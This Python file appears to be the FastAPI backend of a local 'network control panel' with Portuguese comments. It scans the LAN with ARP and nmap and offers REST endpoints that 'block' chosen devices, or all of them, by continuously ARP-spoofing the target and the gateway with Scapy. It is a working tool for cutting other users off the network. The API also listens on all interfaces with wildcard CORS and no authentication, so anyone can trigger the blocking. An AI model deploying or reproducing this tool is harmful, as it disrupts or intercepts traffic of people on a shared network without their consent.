"""
api.py
======
Backend FastAPI para o Painel de Controle da Rede.

Substitui a UI Flet do `main.py`: expõe a mesma lógica (scan, block/unblock
via ARP spoofing, IP manual, atualização OUI) como API REST + WebSocket,
consumida pelo frontend React (`frontend/App.jsx`).

Executar (precisa de privilégios de administrador p/ Scapy):
    sudo uvicorn api:app --host 0.0.0.0 --port 8000
"""

import asyncio
import ipaddress
import os
import threading
from typing import Dict, List, Optional

from fastapi import FastAPI, WebSocket, WebSocketDisconnect
from fastapi.middleware.cors import CORSMiddleware
from pydantic import BaseModel

import network_core as nc
from scapy.all import ARP, send

# ---------------------------------------------------------------------------
# Controlador central de estado
# ---------------------------------------------------------------------------
class NetworkController:
    def __init__(self):
        env = nc.init_environment()
        self.iface = env["iface"]
        self.local_ip = env["local_ip"]
        self.gateway_ip = env["gateway_ip"]
        self.subnet = env["subnet"]
        self.nmap = env["nmap"]

        self.devices: Dict[str, dict] = {}      # ip -> device
        self.attacking: Dict[str, bool] = {}    # ip -> bool
        self.attack_events: Dict[str, threading.Event] = {}

        self.scanning = False
        self.stop_scan_requested = False
        self._subscribers: List[asyncio.Queue] = []
        self._loop: Optional[asyncio.AbstractEventLoop] = None

    # ----- pub/sub p/ WebSocket -----
    def subscribe(self) -> asyncio.Queue:
        q: asyncio.Queue = asyncio.Queue()
        self._subscribers.append(q)
        return q

    def unsubscribe(self, q: asyncio.Queue):
        if q in self._subscribers:
            self._subscribers.remove(q)

    def _publish(self, event: dict):
        for q in list(self._subscribers):
            try:
                q.put_nowait(event)
            except Exception:
                pass

    # ----- modelo de dispositivo -----
    def _status_for(self, ip: str) -> str:
        if ip == self.gateway_ip:
            return "Gateway Padrão"
        if ip == self.local_ip:
            return "Este Dispositivo"
        return "Bloqueado" if self.attacking.get(ip) else "Conectado"

    def upsert(self, ip: str, mac: Optional[str] = None,
               hostname: Optional[str] = None, vendor: Optional[str] = None):
        d = self.devices.get(ip)
        if d:
            if mac and (d["mac"] in ("Desconhecido", "??:??:??:??:??:??") or d["mac"] != mac):
                d["mac"] = mac
                d["vendor"] = vendor or nc.vendor_from_cache_only(mac)
            if hostname and d["hostname"] == "Desconhecido":
                d["hostname"] = hostname
        else:
            d = {
                "ip": ip,
                "mac": mac or "Desconhecido",
                "hostname": hostname or "Desconhecido",
                "vendor": vendor or (nc.vendor_from_cache_only(mac) if mac else "Desconhecido"),
            }
            self.devices[ip] = d
        d["status"] = self._status_for(ip)
        self._publish({"type": "device", "device": d})
        return d

    def snapshot(self) -> List[dict]:
        for ip, d in self.devices.items():
            d["status"] = self._status_for(ip)
        return self._sorted(list(self.devices.values()))

    def _sorted(self, devices: List[dict]) -> List[dict]:
        def key(d):
            ip = d["ip"]
            if ip == self.gateway_ip:
                return (0,)
            if ip == self.local_ip:
                return (1,)
            try:
                return (2, tuple(int(p) for p in ip.split(".")))
            except Exception:
                return (2, (999, 999, 999, 999))
        return sorted(devices, key=key)

    # ----- scan -----
    async def run_scan(self):
        if self.scanning:
            return
        self.scanning = True
        self.stop_scan_requested = False
        self._loop = asyncio.get_running_loop()
        self.devices.clear()
        self._publish({"type": "scan_start"})

        try:
            network_cidr = self.subnet or f"{'.'.join(self.gateway_ip.split('.')[:-1])}.0/24"

            # gateway + local primeiro
            for special_ip in [self.gateway_ip, self.local_ip]:
                if special_ip:
                    mac = await asyncio.to_thread(nc.get_mac, special_ip)
                    self.upsert(special_ip, mac=mac)

            try:
                net = ipaddress.ip_network(network_cidr, strict=False)
                hosts = [str(h) for h in net.hosts()]
            except Exception:
                net = ipaddress.ip_network(
                    f"{'.'.join(self.gateway_ip.split('.')[:-1])}.0/24", strict=False)
                hosts = [str(h) for h in net.hosts()]

            hosts = [h for h in hosts if h not in (self.local_ip, self.gateway_ip)]
            total = len(hosts)
            processed = 0

            CHUNK = 32
            chunks = [hosts[i:i + CHUNK] for i in range(0, total, CHUNK)]
            max_concurrent = min(12, max(4, (os.cpu_count() or 4)))
            semaphore = asyncio.Semaphore(max_concurrent)

            async def scan_chunk(chunk):
                nonlocal processed
                async with semaphore:
                    if self.stop_scan_requested:
                        return
                    results = await asyncio.to_thread(nc.arp_chunk_scan, chunk, self.iface)
                    if self.stop_scan_requested:
                        return
                    for ip, mac in results:
                        self.upsert(ip, mac=mac)
                        asyncio.create_task(self._resolve_hostname(ip))
                    processed += len(chunk)
                    self._publish({
                        "type": "progress",
                        "processed": min(processed, total),
                        "total": total,
                        "found": len(self.devices),
                    })

            await asyncio.gather(*(scan_chunk(c) for c in chunks))

            if self.nmap and not self.stop_scan_requested:
                await self._nmap_supplement(network_cidr)
        finally:
            self.scanning = False
            self._publish({"type": "scan_end", "devices": self.snapshot()})

    async def _resolve_hostname(self, ip: str, timeout: float = 0.75):
        try:
            hostname = await asyncio.wait_for(asyncio.to_thread(nc.get_hostname, ip), timeout=timeout)
        except Exception:
            hostname = None
        if hostname and hostname != "Desconhecido" and not self.stop_scan_requested:
            self.upsert(ip, hostname=hostname)

    async def _nmap_supplement(self, network_cidr: str):
        if not self.nmap:
            return
        try:
            proc = await asyncio.create_subprocess_exec(
                self.nmap, "-sn", "-T4", network_cidr,
                stdout=asyncio.subprocess.PIPE, stderr=asyncio.subprocess.PIPE,
            )
            current_ip = None
            while True:
                if self.stop_scan_requested:
                    try:
                        proc.kill()
                    except Exception:
                        pass
                    return
                line = await proc.stdout.readline()
                if not line:
                    break
                s = line.decode(errors="ignore").strip()
                if "Nmap scan report for" in s:
                    import re
                    m = re.search(r"\((\d+\.\d+\.\d+\.\d+)\)", s)
                    current_ip = m.group(1) if m else s.split("for", 1)[1].strip().split()[-1]
                    if current_ip:
                        self.upsert(current_ip)
                elif "MAC Address:" in s and current_ip:
                    try:
                        mac = s.split("MAC Address: ")[1].split()[0]
                        self.upsert(current_ip, mac=mac)
                    finally:
                        current_ip = None
            await proc.wait()
        except Exception:
            return

    def stop_scan(self):
        self.stop_scan_requested = True

    # ----- IP manual -----
    async def add_manual_ip(self, ip_str: str) -> dict:
        ipaddress.ip_address(ip_str)  # levanta ValueError se inválido
        mac = await asyncio.to_thread(nc.get_mac, ip_str)
        d = self.upsert(ip_str, mac=mac)
        asyncio.create_task(self._resolve_hostname(ip_str))
        return d

    # ----- ataque ARP (block/unblock) -----
    def _spoof(self, target_ip, spoof_ip, target_mac):
        if target_mac:
            try:
                send(ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip),
                     verbose=False, iface=self.iface)
            except Exception:
                pass

    def _restore(self, target_ip, source_ip, target_mac, source_mac):
        if target_mac and source_mac:
            try:
                send(ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=source_ip, hwsrc=source_mac),
                     count=6, verbose=False, iface=self.iface)
            except Exception:
                pass

    def block(self, target_ip: str) -> bool:
        target = self.devices.get(target_ip)
        gateway = self.devices.get(self.gateway_ip)
        if not target or not gateway or not target.get("mac") or not gateway.get("mac"):
            return False
        if self.attacking.get(target_ip):
            return True
        target_mac = target["mac"]
        gateway_mac = gateway["mac"]
        stop_event = threading.Event()
        self.attack_events[target_ip] = stop_event
        self.attacking[target_ip] = True

        def loop():
            while not stop_event.is_set():
                self._spoof(target_ip, self.gateway_ip, target_mac)
                self._spoof(self.gateway_ip, target_ip, gateway_mac)
                stop_event.wait(timeout=2)

        threading.Thread(target=loop, daemon=True).start()
        self.upsert(target_ip)
        return True

    def unblock(self, target_ip: str) -> bool:
        if not self.attacking.get(target_ip):
            return True
        self.attacking[target_ip] = False
        ev = self.attack_events.pop(target_ip, None)
        if ev:
            ev.set()
        target = self.devices.get(target_ip)
        gateway = self.devices.get(self.gateway_ip)
        if target and gateway:
            tm, gm = target.get("mac"), gateway.get("mac")
            self._restore(target_ip, self.gateway_ip, tm, gm)
            self._restore(self.gateway_ip, target_ip, gm, tm)
        self.upsert(target_ip)
        return True

    def block_all(self):
        for ip, d in list(self.devices.items()):
            if d["status"] == "Conectado" and ip not in (self.gateway_ip, self.local_ip):
                self.block(ip)

    def unblock_all(self):
        for ip in [ip for ip, a in list(self.attacking.items()) if a]:
            if ip not in (self.gateway_ip, self.local_ip):
                self.unblock(ip)


# ---------------------------------------------------------------------------
# App FastAPI
# ---------------------------------------------------------------------------
app = FastAPI(title="Painel de Controle da Rede")
app.add_middleware(
    CORSMiddleware,
    allow_origins=["*"],
    allow_methods=["*"],
    allow_headers=["*"],
)

controller: Optional[NetworkController] = None


def get_controller() -> NetworkController:
    global controller
    if controller is None:
        controller = NetworkController()
    return controller


class ManualIP(BaseModel):
    ip: str


@app.get("/api/info")
def info():
    c = get_controller()
    return {
        "iface": c.iface,
        "local_ip": c.local_ip,
        "gateway_ip": c.gateway_ip,
        "subnet": c.subnet,
        "nmap": bool(c.nmap),
        "scanning": c.scanning,
    }


@app.get("/api/devices")
def list_devices():
    return get_controller().snapshot()


@app.post("/api/scan/start")
async def scan_start():
    c = get_controller()
    if not c.scanning:
        asyncio.create_task(c.run_scan())
    return {"scanning": True}


@app.post("/api/scan/stop")
def scan_stop():
    get_controller().stop_scan()
    return {"scanning": False}


@app.post("/api/devices/{ip}/block")
def block(ip: str):
    return {"ok": get_controller().block(ip)}


@app.post("/api/devices/{ip}/unblock")
def unblock(ip: str):
    return {"ok": get_controller().unblock(ip)}


@app.post("/api/block-all")
def block_all():
    get_controller().block_all()
    return {"ok": True}


@app.post("/api/unblock-all")
def unblock_all():
    get_controller().unblock_all()
    return {"ok": True}


@app.post("/api/devices")
async def add_device(payload: ManualIP):
    try:
        d = await get_controller().add_manual_ip(payload.ip.strip())
        return {"ok": True, "device": d}
    except ValueError:
        return {"ok": False, "error": "IP inválido"}


@app.post("/api/oui/update")
async def oui_update():
    added = await asyncio.to_thread(nc.update_vendor_cache_from_ieee)
    return {"added": added}


@app.websocket("/ws")
async def ws(websocket: WebSocket):
    await websocket.accept()
    c = get_controller()
    q = c.subscribe()
    try:
        # estado inicial
        await websocket.send_json({"type": "snapshot", "devices": c.snapshot()})
        while True:
            event = await q.get()
            await websocket.send_json(event)
    except WebSocketDisconnect:
        pass
    finally:
        c.unsubscribe(q)


if __name__ == "__main__":
    import uvicorn
    uvicorn.run(app, host="0.0.0.0", port=8000)
